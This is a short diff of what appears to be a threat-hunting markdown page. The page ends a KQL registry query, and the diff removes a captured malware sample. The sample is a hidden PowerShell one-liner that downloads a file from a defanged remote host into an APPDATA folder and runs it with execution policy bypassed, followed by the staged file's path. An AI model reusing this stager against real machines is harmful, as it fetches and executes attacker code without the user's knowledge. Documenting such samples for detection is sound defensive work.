@@ -165,15 +165,3 @@ DeviceRegistryEvents
 | project-reorder Timestamp, PreviousRegistryKey, PreviousRegistryValueName, PreviousRegistryValueData, InitiatingProcessCommandLine
 ```
 </details>
-
-
-
-
-```PowerShell
-powershell -w h -nop -c "$s=Join-Path $env:APPDATA 'djw\6kn9.ps1';md (Split-Path $s) -ea 0;$l='hxxps://cbtechnic[.]com/0.wav';iwr $l -OutFile $s;& powershell -w h -ep Bypass -f $s"
-```
-
-**Stage 1**
-```
-C:\Users\level1\AppData\Roaming\djw\6kn9.ps1
-```
